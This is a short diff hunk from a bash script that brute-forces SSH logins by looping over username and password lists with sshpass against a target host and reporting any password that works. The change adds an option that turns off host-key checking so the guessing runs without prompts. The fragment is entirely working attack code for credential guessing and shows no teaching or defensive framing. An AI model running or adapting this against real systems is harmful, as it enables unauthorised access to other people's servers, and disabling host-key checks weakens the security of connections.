@@ -36,7 +36,7 @@ for users in `cat usernames`; do
 for passwd in  `cat passwords`; do
 count=$((count+1))
 elapsed_time
-response=$(sshpass -p "$passwd" ssh -q -o connecttimeout=5 -p 22 $users@$1 echo 0 2>&1)
+response=$(sshpass -p "$passwd" ssh -o StrictHostKeyChecking=no -q -o connecttimeout=5 -p 22 $users@$1 echo 0 2>&1)
 if  [[ $? == 0 ]] ; then printf "\nfound 1 password for user $users password:$passwd\n"
 printf "\033[?25h"
 exit
